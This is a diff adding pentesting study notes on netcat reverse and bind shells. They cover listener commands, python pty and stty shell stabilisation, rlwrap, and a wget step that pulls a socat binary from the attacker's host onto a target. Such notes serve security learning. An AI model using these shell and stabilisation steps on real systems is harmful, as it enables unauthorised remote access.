@@ -15,10 +15,90 @@
 * Reverse Shell
 * Bind Shell
 
+### Netcat Shells 101
+
+Netcat, the Swiss Army knife of pentesting, is crucial for networking tasks. Let's delve into shells:
+
+#### Reverse Shells
+
+Setting up a netcat listener on Linux is as easy as:
+
+```bash
+nc -lvnp <port-number>
+```
+
+- `-l`: listener
+- `-v`: verbose output
+- `-n`: skip DNS resolution
+- `-p`: specify the port
+
+For example, to listen on port 443:
+
+```bash
+sudo nc -lvnp 443
+```
+
+Choose ports wisely; sudo needed for < 1024. Common choices: 80, 443, or 53.
+
+#### Connecting Back
+
+Connect back with payloads based on the target environment. Check the example in the previous task for a connection demonstration.
+
+#### Bind Shells
+
+For bind shells, assume a waiting listener on the target:
+
+```bash
+nc <target-ip> <chosen-port>
+```
+
+Make an outbound connection to the target on your chosen port. Task 8 will cover creating a listener for bind shells. The key here is understanding how to connect to a listening port using netcat. 🚀
+
 # Illustrating Shells using NetCat
 
 ![bindreverse-removebg-preview](https://github.com/PranjalBasak/Documentation/assets/66166653/115194d8-e7a9-425e-a1fc-fe555c16b0b4)
 
+### Stabilizing Netcat Shells on Linux
+
+So, you've got a Netcat shell, but it's a bit wonky. Here are three techniques to make it more stable on Linux:
+
+#### Technique 1: Python Magic
+
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+Ctrl + Z
+stty raw -echo; fg
+```
+
+Backgrounding the shell and foregrounding it again improves functionality. If the shell dies, type `reset` to fix visibility issues.
+
+#### Technique 2: rlwrap
+
+Install rlwrap with `sudo apt install rlwrap` and use it with Netcat:
+
+```bash
+rlwrap nc -lvnp <port>
+```
+
+Provides history, tab completion, and arrow keys. Handy for stabilizing Windows shells too.
+
+#### Technique 3: Socat Stepping Stone
+
+For Linux targets, use Socat for a more stable shell:
+
+1. Transfer a statically compiled socat binary to the target.
+2. Download it using Netcat: `wget <LOCAL-IP>/socat -O /tmp/socat`.
+3. Execute socat for a more fully-featured shell.
+
+Change your terminal size manually for tasks like text editing:
+
+```bash
+stty -a (note rows and columns values)
+stty rows <number> && stty cols <number>
+```
+
+Adjusting terminal size helps programs like text editors work correctly. Choose the technique that fits your scenario! 🚀
 
 ## Reverse Shell
 ### On the attacking machine
